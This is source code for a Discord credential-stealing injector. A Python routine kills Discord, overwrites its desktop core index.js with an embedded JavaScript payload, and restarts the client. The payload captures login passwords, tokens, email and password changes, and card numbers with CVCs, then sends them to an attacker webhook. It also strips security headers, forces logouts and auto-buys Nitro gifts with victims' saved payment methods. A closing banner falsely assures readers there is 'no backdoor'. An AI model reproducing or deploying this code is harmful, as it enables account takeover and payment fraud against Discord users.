function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def D3f_Di5c0rdInj3c710n():
    import os
    import re
    import subprocess
    import psutil

    v4r_number_discord_injection = "Active"

    def D3f_G3tC0r3(v4r_dir):
        for v4r_file in os.listdir(v4r_dir):
            if re.search(r'app-+?', v4r_file):
                v4r_modules = v4r_dir + '\\' + v4r_file + '\\modules'
                if not os.path.exists(v4r_modules):
                    continue
                for v4r_file in os.listdir(v4r_modules):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        v4r_core = v4r_modules + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return v4r_core, v4r_file
        return None

    def D3f_St4rtD15c0rd(v4r_dir):
        v4r_update = v4r_dir + '\\Update.exe'
        v4r_executable = v4r_dir.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(v4r_dir):
            if re.search(r'app-+?', v4r_file):
                v4r_app = v4r_dir + '\\' + v4r_file
                if os.path.exists(v4r_app + '\\' + 'modules'):
                    for v4r_file in os.listdir(v4r_app):
                        if v4r_file == v4r_executable:
                            v4r_executable = v4r_app + '\\' + v4r_executable
                            subprocess.call([v4r_update, '--processStart', v4r_executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def D3f_Inj3ctC0d3():
        v4r_appdata = os.getenv('LOCALAPPDATA')
        v4r_discord_dirs = [
            v4r_appdata + '\\Discord',
            v4r_appdata + '\\DiscordCanary',
            v4r_appdata + '\\DiscordPTB',
            v4r_appdata + '\\DiscordDevelopment'
        ]
        v4r_code = v4r_inj3c710n_c0d3

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for v4r_dir in v4r_discord_dirs:
            if not os.path.exists(v4r_dir):
                continue

            v4r_core_info = D3f_G3tC0r3(v4r_dir)
            if v4r_core_info is not None:
                v4r_core, v4r_core_file = v4r_core_info
                
                v4r_index_js_path = v4r_core + '\\index.js'
                
                if not os.path.exists(v4r_index_js_path):
                    open(v4r_index_js_path, 'w').close()

                with open(v4r_index_js_path, 'w', encoding='utf-8') as f:
                    f.write((v4r_code).replace('discord_desktop_core-1', v4r_core_file)
                            .replace(r"%WEBHOOK_HERE%", v4r_w3bh00k_ur1)
                            .replace(r"%EMBED_COLOR%", str(v4r_color_embed))
                            .replace(r"%USERNAME%", v4r_username_pc)
                            .replace(r"%IP_PUBLIC%", v4r_ip_address_public)
                            .replace(r"%EMBED_NAME%", v4r_username_embed)
                            .replace(r"%EMBED_ICON%", v4r_avatar_embed)
                            .replace(r"%FOOTER_TEXT%", v4r_footer_text)
                            .replace(r"%WEBSITE%", v4r_website))
                D3f_St4rtD15c0rd(v4r_dir)
                
    D3f_Inj3ctC0d3()
    return v4r_number_discord_injection
'''

#    ╔════════════════════════════════════════════════════════════════════════════╗
#    ║ ! File detected by the antivirus, but be aware that there is no backdoor ! ║
#    ╚════════════════════════════════════════════════════════════════════════════╝